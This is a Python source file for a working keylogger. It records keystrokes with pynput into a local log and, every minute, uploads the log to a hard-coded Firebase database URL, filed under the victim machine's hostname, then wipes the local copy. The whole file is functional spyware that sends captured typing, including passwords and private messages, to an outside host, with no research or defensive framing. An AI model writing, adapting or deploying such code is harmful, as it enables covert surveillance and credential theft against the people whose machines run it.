from pynput.keyboard import Key, Listener
import os
from datetime import datetime
import requests
import socket
import threading
import time

firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
log_file = "keylog.txt"
hostname = socket.gethostname()

# Function to check internet availability
def is_internet_available():
    try:
        # Attempt to connect to a public DNS server
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False

# Function to upload the log file to Firebase
def upload_log():
    if not is_internet_available():
        print("Internet not available, skipping upload.")
        return False
    
    db_path = f'users/{hostname}/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
    with open(log_file, 'r') as file:
        file_data = file.read()
    data_to_upload = {'runnner': file_data}
    
    try:
        response = requests.put(firebase_url + db_path, json=data_to_upload)
        if response.status_code == 200:
            print(f"Uploaded: {log_file}")
            # Clear the log file after successful upload
            with open(log_file, 'w') as file:
                file.truncate(0)
            # Add a mark for the new logging session
            with open(log_file, 'a') as file:
                file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            return True
        else:
            print(f"Failed to upload (Status code {response.status_code}): {log_file}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Failed to upload {log_file}: {e}")
        return False

# Function to periodically attempt uploading the log file every 1 minute
def periodic_upload():
    while True:
        if upload_log():
            print("Log file uploaded successfully and cleared.")
        else:
            print("Upload failed. Retrying in 1 minute.")
        time.sleep(60)  # Wait for 1 minute before the next attempt

# Debounce settings for keystrokes
recent_keys = {}
debounce_time = 0.2

# Function to write keystrokes to the current log file with debounce
def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = "\t"
    elif key == Key.enter:
        key_str = "\n"
    elif key == Key.backspace:
        key_str = "[BS]"
    
    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time

# Function to start the listener for keystrokes
def start_listener():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

# Ensure the log file exists, create it if it doesn't
def ensure_log_exists():
    if not os.path.exists(log_file):  # Create the log file if it doesn't exist
        with open(log_file, 'w') as file:
            pass  # Create an empty log file

# Main process: check if the log has been uploaded and create a new log if necessary
if __name__ == "__main__":
    ensure_log_exists()  # Ensure that the log file exists

    # Add a mark indicating the start of a new logging session
    with open(log_file, 'a') as file:
        file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    # Start listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    # Start periodic upload in a separate thread
    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()

    # Keep the main thread running
    listener_thread.join()
    upload_thread.join()
